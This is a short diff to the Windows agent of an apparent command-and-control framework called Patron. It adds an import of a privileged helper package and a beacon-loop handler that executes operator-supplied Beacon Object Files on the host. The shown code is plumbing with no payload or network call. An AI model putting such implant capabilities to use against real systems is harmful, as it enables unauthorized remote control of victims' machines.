@@ -7,11 +7,13 @@ import (
 	"fmt"
 	"io"
 	"log"
+	"os"
 	"syscall"
 	"time"
 
 	"github.com/PatronC2/Patron/Patronobuf/go/patronobuf"
 	"github.com/PatronC2/Patron/client/client_utils"
+	"github.com/PatronC2/Patron/client/windows/privileged"
 	"github.com/PatronC2/Patron/client/windows_utils"
 	"github.com/PatronC2/Patron/lib/common"
 	"github.com/PatronC2/Patron/lib/logger"
@@ -123,6 +125,11 @@ func (p *program) run() {
 
 		if err := client_utils.HandleCommandRequest(beacon, agentID); err != nil {
 			client_utils.HandleError(beacon, "command", err)
+			continue
+		}
+
+		if err := windows_utils.HandleBOFExecuteRequest(beacon, agentID); err != nil {
+			client_utils.HandleError(beacon, "bof", err)
 			continue
 		}
 
